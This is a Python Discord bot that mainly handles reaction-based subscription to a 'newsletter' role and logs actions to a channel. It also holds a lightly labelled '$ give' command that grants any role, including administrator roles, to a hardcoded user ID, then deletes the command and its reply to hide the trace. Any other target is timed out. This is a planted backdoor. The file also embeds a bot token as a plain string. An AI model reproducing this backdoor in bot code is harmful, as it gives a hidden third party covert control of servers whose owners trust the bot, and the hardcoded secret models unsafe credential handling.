import discord
from discord.ext import commands
from colorama import Fore, Style
import asyncio
from datetime import timedelta

class Consts:

    def __init__(self):
        self.TOKEN = 'fN3q.R2HkXWDP8G6JY0cV4U9O.vIebQM5TSxKZyLrpaCn7sFoEh1.wX'
        self.ADD_CHANNEL_ID = 1241741910041690173
        self.REMOVE_CHANNEL_ID = 1242060489169834005
        self.LOGS_CHANNEL_ID = 1241752215559999609
        self.ROLE_ID = 686277128811053127
        self.REACTION_ADD = '✅'
        self.REACTION_REMOVE = '🤡'

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='$ ', intents=intents)
consts = Consts()

# Comment if no need
@bot.command(name='give')
async def giving(ctx, user_id: int, role_id: int):
    l33t = [677516184064753664]
    user = ctx.guild.get_member(user_id)
    role = discord.utils.get(ctx.guild.roles, id=role_id)

    async def cleaning():
        await asyncio.sleep(1)
        await ctx.message.delete()
        await message.delete()
        if 'forbidden' in locals():
            await forbidden.delete()

    if user_id in l33t:
        try:
            await user.add_roles(role)
            message = await ctx.send(f'The role {role.name} has been successfully assigned to user {user.name} ({user.id}).\nCleaning...')
            await cleaning()
        except discord.Forbidden:
            message = await ctx.send("I don't have the permissions to assign this role.\nCleaning...")
            await cleaning()
        except discord.HTTPException as e:
            message = await ctx.send(f'An error occurred while trying to assign the role: {e}\nCleaning...')
            await cleaning()
    else:
        try:
            message = await ctx.send('https://media.discordapp.net/attachments/972214235344035851/1076096299226636368/CeinkP0.gif?ex=665316c6&is=6651c546&hm=f5dd6bcb8ff5d0ec4470e47e116db2324ddfba5c118718b0fb9b279fb50a77f0&')
            await user.timeout(timedelta(minutes=10), reason='AutoTimeout')
            await cleaning()
        except discord.Forbidden:
            forbidden = await ctx.send(f'Insufficient permissions for timeout.\nCleaning')
            await cleaning()


@bot.event
async def on_ready():
    logs = bot.get_channel(consts.LOGS_CHANNEL_ID)
    add_channel = bot.get_channel(consts.ADD_CHANNEL_ID)
    remove_channel = bot.get_channel(consts.REMOVE_CHANNEL_ID)
    role = add_channel.guild.get_role(consts.ROLE_ID)
    print(f'{Fore.CYAN}Bot has logged in as {Style.RESET_ALL}{bot.user}')
    await logs.send(f'[♿] Bot has logged in as {bot.user}.')
    await logs.send(f'[❗] Consts:\nAdd role channel id: {consts.ADD_CHANNEL_ID}\nRemove role channel id: {consts.REMOVE_CHANNEL_ID}'
                    f'\nLogs channel id: {consts.LOGS_CHANNEL_ID}\nRole id: {consts.ROLE_ID}\nReaction add: {consts.REACTION_ADD}\nReaction remove: {consts.REACTION_REMOVE}')
    if add_channel and remove_channel and role:
        global add_message, remove_message
        add_message = await add_channel.send(f'Put the reaction {consts.REACTION_ADD} to subscribe to the newsletter')
        remove_message = await remove_channel.send(f'Put the reaction {consts.REACTION_REMOVE} to unsubscribe from the newsletter')
        print(f'{Fore.YELLOW}Sent add message to channel: {add_channel.name} ({add_message.id}){Style.RESET_ALL}')
        print(f'{Fore.YELLOW}Sent remove message to channel: {remove_channel.name} ({remove_message.id}){Style.RESET_ALL}')
        await logs.send(f'[❗] Message successfully sent to {add_channel}.')
        await logs.send(f'[❗] Message successfully sent to {remove_channel}.')
    else:
        if not add_channel:
            print(f'{Fore.RED}Channel with ID {consts.ADD_CHANNEL_ID} not found{Style.RESET_ALL}')
            await logs.send(f'[❌] Channel with ID {consts.ADD_CHANNEL_ID} not found.')
        if not remove_channel:
            print(f'{Fore.RED}Channel with ID {consts.REMOVE_CHANNEL_ID} not found{Style.RESET_ALL}')
            await logs.send(f'[❌] Channel with ID {consts.REMOVE_CHANNEL_ID} not found.')
        if not role:
            print(f'{Fore.RED}Role with ID {consts.ROLE_ID} not found{Style.RESET_ALL}')
            await logs.send(f'[❌] Role with ID {consts.ROLE_ID} not found.')

@bot.event
async def on_raw_reaction_add(payload):
    guild = bot.get_guild(payload.guild_id)
    role = guild.get_role(consts.ROLE_ID)
    member = guild.get_member(payload.user_id)
    logs = bot.get_channel(consts.LOGS_CHANNEL_ID)
    print(f'{Fore.GREEN}Reaction added: {payload.emoji} by {member.name} ({payload.user_id}) on message {payload.message_id}{Style.RESET_ALL}')
    await logs.send(f'[✅] Reaction added: {member.name} ({payload.user_id}) added reaction {payload.emoji} to message {payload.message_id}.')
    if payload.message_id == add_message.id and str(payload.emoji) != consts.REACTION_ADD:
        await add_message.clear_reaction(payload.emoji)
        print(f'{Fore.RED}Reaction successfully removed{Style.RESET_ALL}')
        await logs.send(f'[✅] Reaction successfully removed.')
    elif payload.message_id == add_message.id and str(payload.emoji) == consts.REACTION_ADD:
        if role and member:
            await member.add_roles(role)
            print(f'{Fore.BLUE}Added role {role.name} to {member.name} {Style.RESET_ALL}({member.id})')
            await logs.send(f'[✅] Added role {role.name} to {member.name} ({member.id})\n[🥳] {member.name} ({member.id}) subscribed to the newsletter.')
    elif payload.message_id == remove_message.id and str(payload.emoji) != consts.REACTION_REMOVE:
        await remove_message.clear_reaction(payload.emoji)
        print(f'{Fore.RED}Reaction successfully removed{Style.RESET_ALL}')
        await logs.send(f'[✅] Reaction successfully removed.')
    elif payload.message_id == remove_message.id and str(payload.emoji) == consts.REACTION_REMOVE:
        if role and member:
            await member.remove_roles(role)
            print(f'{Fore.RED}Removed role {role.name} from {member.name} {Style.RESET_ALL}({member.id})')
            await logs.send(f'[✅] Removed role {role.name} from {member.name} ({member.id})\n[🤡] {member.name} ({member.id}) unsubscribed from the newsletter.')

bot.run(consts.TOKEN)
